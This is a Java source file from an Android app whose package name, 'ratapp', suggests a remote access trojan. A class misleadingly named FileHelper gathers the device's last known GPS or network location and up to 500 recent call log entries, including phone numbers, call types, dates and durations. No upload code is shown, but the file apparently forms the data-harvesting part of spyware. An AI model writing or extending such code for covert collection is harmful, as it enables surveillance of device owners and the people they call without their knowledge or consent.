package com.ratio.ratapp;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.provider.CallLog;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class FileHelper {

    public static Map<String, Object> getLocation(Context ctx) {
        Map<String, Object> m = new HashMap<>();
        try {
            LocationManager lm = (LocationManager)
                ctx.getSystemService(Context.LOCATION_SERVICE);
            if (ctx.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc == null) {
                    loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                if (loc != null) {
                    m.put("lat", loc.getLatitude());
                    m.put("lon", loc.getLongitude());
                    m.put("acc", loc.getAccuracy());
                    m.put("provider", loc.getProvider());
                } else {
                    m.put("error", "no last known location");
                }
            } else {
                m.put("error", "no permission");
            }
        } catch (Exception e) {
            m.put("error", e.getMessage());
        }
        return m;
    }

    public static List<Map<String, Object>> getCallLog(Context ctx) {
        List<Map<String, Object>> out = new ArrayList<>();
        Cursor c = null;
        try {
            c = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                int max = 500;
                while (c.moveToNext() && out.size() < max) {
                    Map<String, Object> e = new HashMap<>();
                    e.put("number", s(c, CallLog.Calls.NUMBER));
                    e.put("type",   s(c, CallLog.Calls.TYPE));
                    e.put("date",   s(c, CallLog.Calls.DATE));
                    e.put("dur",    s(c, CallLog.Calls.DURATION));
                    out.add(e);
                }
            }
        } catch (Exception ignored) {
        } finally {
            if (c != null) c.close();
        }
        return out;
    }

    private static String s(Cursor c, String col) {
        int i = c.getColumnIndex(col);
        return i < 0 ? "" : String.valueOf(c.getString(i));
    }
}
